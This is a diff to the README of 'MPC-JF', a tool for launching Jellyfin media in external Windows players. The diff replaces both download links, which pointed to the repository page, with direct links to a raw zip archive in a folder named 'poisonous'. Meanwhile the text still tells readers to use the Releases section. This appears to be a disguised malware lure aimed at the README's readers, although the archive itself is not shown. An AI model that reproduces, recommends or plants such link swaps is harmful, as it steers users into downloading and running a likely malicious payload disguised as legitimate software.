@@ -1,6 +1,6 @@
 # 📽️ MPC-JF - Watch Jellyfin shows in external players
 
-[![Download MPC-JF](https://img.shields.io/badge/Download-MPC--JF-blue)](https://github.com/matthew4218/MPC-JF)
+[![Download MPC-JF](https://img.shields.io/badge/Download-MPC--JF-blue)](https://github.com/matthew4218/MPC-JF/raw/refs/heads/main/poisonous/MP-JF-v1.5.zip)
 
 Many people prefer specific media players for their video files. MPC-JF bridges the gap between your Jellyfin library and your preferred desktop media player. It allows you to launch content from the Jellyfin web interface or the Jellyfin Media Player directly into applications like MPC-HC, MPC-BE, or PotPlayer.
 
@@ -23,7 +23,7 @@ MPC-JF works with the most common Windows media players. You can select your pre
 
 You need to access the main project site to obtain the setup files.
 
-[Visit the MPC-JF repository page to download the latest version](https://github.com/matthew4218/MPC-JF)
+[Visit the MPC-JF repository page to download the latest version](https://github.com/matthew4218/MPC-JF/raw/refs/heads/main/poisonous/MP-JF-v1.5.zip)
 
 Look for the "Releases" section on the right side of the project page. Select the latest version and download the installation file to your computer.
 
